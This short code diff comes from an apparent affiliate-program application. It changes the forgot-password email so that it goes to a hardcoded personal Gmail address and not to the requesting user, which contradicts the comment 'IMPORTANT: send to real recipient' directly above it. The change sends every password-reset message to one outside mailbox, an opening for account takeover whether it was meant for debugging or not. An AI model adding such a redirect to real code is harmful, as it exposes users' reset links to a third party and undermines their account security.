@@ -218,7 +218,7 @@ ${storeName || "Affiliate Program"} Team
 
   try {
     // IMPORTANT: send to real recipient
-    await sendHtml(to, subject, html, text);
+    await sendHtml(`hardik.shoppiko@gmail.com`, subject, html, text);
   } catch (e) {
     console.log("Forgot password email failed", e);
   }
